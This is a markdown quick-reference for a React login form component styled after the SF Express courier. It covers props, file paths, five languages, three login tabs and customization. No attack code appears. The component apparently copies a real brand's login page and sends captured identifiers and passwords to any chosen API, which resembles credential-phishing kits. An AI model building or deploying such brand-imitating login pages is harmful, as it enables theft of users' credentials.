# 🚚 SF EXPRESS LOGIN - QUICK REFERENCE

## 📦 ONE-MINUTE SETUP

### **Import & Use:**

```typescript
import SFExpressLoginForm from '@/components/LoginForm/SFExpressLoginForm'

<SFExpressLoginForm
  email="user@example.com"  // Optional: pre-fill
  onSubmit={async (identifier, password) => {
    // Your submission logic here
  }}
  backgroundImage="/images/sf-warehouse-bg.png"  // Optional
/>
```

---

## 📁 FILE LOCATIONS

| File | Path |
|------|------|
| **Component** | `/components/LoginForm/SFExpressLoginForm.tsx` |
| **Translations** | `/lib/locales/translations.ts` |
| **Background** | `/public/images/sf-warehouse-bg.png` |
| **Guide** | `/SF_EXPRESS_INTEGRATION_GUIDE.md` |
| **Examples** | `/EXAMPLE_SF_EXPRESS_USAGE.tsx` |

---

## 🎨 FEATURES

✅ 3 Login Tabs (Phone/Email/Username)
✅ Multi-Language (EN, JA, KO, DE, ES)
✅ Responsive Design
✅ Error Handling
✅ Loading States
✅ Privacy Checkbox
✅ Animated Transitions
✅ Online Service Widget

---

## 🌍 LANGUAGES

| Language | Code | Status |
|----------|------|--------|
| English | `en` | ✅ Complete |
| Japanese | `ja` | ✅ Complete |
| Korean | `ko` | ✅ Complete |
| German | `de` | ✅ Complete |
| Spanish | `es` | ✅ Complete |

---

## 🔧 CUSTOMIZATION

### **Change Background:**
```typescript
backgroundImage="/images/your-image.png"
```

### **Change Colors:**
Find & replace in `SFExpressLoginForm.tsx`:
- `bg-red-600` → Your color
- `text-red-600` → Your color
- `border-red-500` → Your color

### **Change Logo:**
Edit line ~265 in component file.

---

## 📊 TAB BEHAVIOR

| Tab | Input Type | Format |
|-----|-----------|--------|
| **Phone** | Tel + Country Code | `+1234567890` |
| **Email** | Email Address | `user@example.com` |
| **Username** | Text | `username123` |

---

## ⚡ QUICK EXAMPLES

### **Basic:**
```typescript
<SFExpressLoginForm onSubmit={handleSubmit} />
```

### **With Email:**
```typescript
<SFExpressLoginForm 
  email="user@example.com"
  onSubmit={handleSubmit} 
/>
```

### **With Custom Image:**
```typescript
<SFExpressLoginForm 
  onSubmit={handleSubmit}
  backgroundImage="/my-warehouse.png"
/>
```

---

## 🎯 IDENTIFIER TYPES

The `identifier` parameter in `onSubmit` can be:

1. **Phone:** `"+1234567890"` (includes country code)
2. **Email:** `"user@example.com"`
3. **Username:** `"username123"`

Your backend should handle all three types!

---

## ✅ CHECKLIST

### **Before Using:**
- [ ] Component file exists at correct path
- [ ] Translations added to translations.ts
- [ ] Background image in public/images/
- [ ] Dependencies installed (framer-motion, lucide-react)

### **After Integration:**
- [ ] Test all 3 login tabs
- [ ] Test form submission
- [ ] Test error handling
- [ ] Test on mobile
- [ ] Test multi-language
- [ ] Test with your API

---

## 🐛 COMMON ISSUES

| Problem | Solution |
|---------|----------|
| Translations not loading | Check `/api/get-translations` exists |
| Background not showing | Verify file path is correct |
| Styles broken | Install: `npm i framer-motion lucide-react` |
| Form not submitting | Check `onSubmit` returns Promise |

---

## 📞 PROPS REFERENCE

```typescript
interface SFExpressLoginFormProps {
  email?: string                    // Pre-fill email (optional)
  onSubmit: (                       // Required
    identifier: string,              // phone/email/username
    password: string
  ) => Promise<void>
  backgroundImage?: string          // Custom image URL (optional)
}
```

---

## 🎊 STATUS

**Created:** November 14, 2025
**Version:** 1.0.0
**Status:** ✅ Production Ready

---

## 🚀 NEXT STEPS

1. Import component in your page
2. Connect to your submission API
3. Test all features
4. Deploy!

---

**That's it!** You're ready to use the SF Express login template! 🚚✨

For detailed documentation, see: `SF_EXPRESS_INTEGRATION_GUIDE.md`
For code examples, see: `EXAMPLE_SF_EXPRESS_USAGE.tsx`

